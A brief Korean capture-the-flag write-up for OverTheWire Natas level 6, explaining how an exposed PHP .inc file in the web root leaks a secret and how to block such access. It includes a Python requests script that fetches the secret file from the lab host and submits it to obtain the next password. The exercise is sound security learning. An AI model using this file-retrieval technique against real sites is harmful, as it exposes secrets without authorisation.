# 배운 점

php에서 `.inc` 파일은 공통 로직을 분리하기 위해 사용된다. 해당 파일이 웹 루트에 존재하고 직접 접근이 가능하면 노출될 수 있다.

# 풀이 과정 기록

php코드의 의미는 알았지만 사용해본 적이 없어, 저 `include`되는 부분을 어떻게 가져와야하는 지 고민을 좀 하다 경로에 넣어봤는데, 그대로 가져와져서 쉽게 풀렸다.

# 익스플로잇 코드 정리

# 심화 학습 (Deep Dive)

- `.inc`파일을 `/var/www/html` 웹루트가 아닌 경로에 두어 외부에서 접근할 수 없는 위치로 변경하거나 웹서버 설정에서 확장자 기반으로 접근이 안되게 강제하여 막을 수 있다.

- 아래의 코드를 통해서도 값을 가져올 수 있다.

  ```python
  from requests import request as req

  auth = ("natas6", "0R...ed")

  # php $secret 정보 가져오기
  def get_secret():
    res = req(
      auth=auth,
      method="GET",
      url="http://natas6.natas.labs.overthewire.org/includes/secret.inc"
    )

    return res.text.split('"')[1]

  # 다음 비밀번호 요청
  def get_flag(secret: str):
    res = req(
      auth=auth,
      method="POST",
      url="http://natas6.natas.labs.overthewire.org/",
      data={
        "secret": secret,
        "submit": ""
      }
    )

    print(res.text)

  secret = get_secret()
  get_flag(secret)
  ```

# 한 줄 평

"오랜만에 만나는 php"

# 참고
